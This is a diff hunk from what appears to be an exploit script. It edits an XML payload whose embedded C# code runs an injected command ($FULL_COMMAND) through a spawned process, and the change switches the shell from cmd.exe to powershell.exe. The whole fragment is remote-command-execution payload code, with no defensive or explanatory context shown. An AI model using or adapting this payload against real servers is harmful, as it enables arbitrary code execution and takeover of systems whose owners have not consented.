@@ -32,7 +32,7 @@ PAYLOAD='<?xml version="1.0"?>
 public string xml() { 
   string cmd = "'$FULL_COMMAND'"; 
   System.Diagnostics.Process proc = new System.Diagnostics.Process();
-  proc.StartInfo.FileName = "cmd.exe"; 
+  proc.StartInfo.FileName = "powershell.exe"; 
   proc.StartInfo.Arguments = "/c " + cmd; 
   proc.StartInfo.UseShellExecute = false; 
   proc.StartInfo.RedirectStandardOutput = true;  
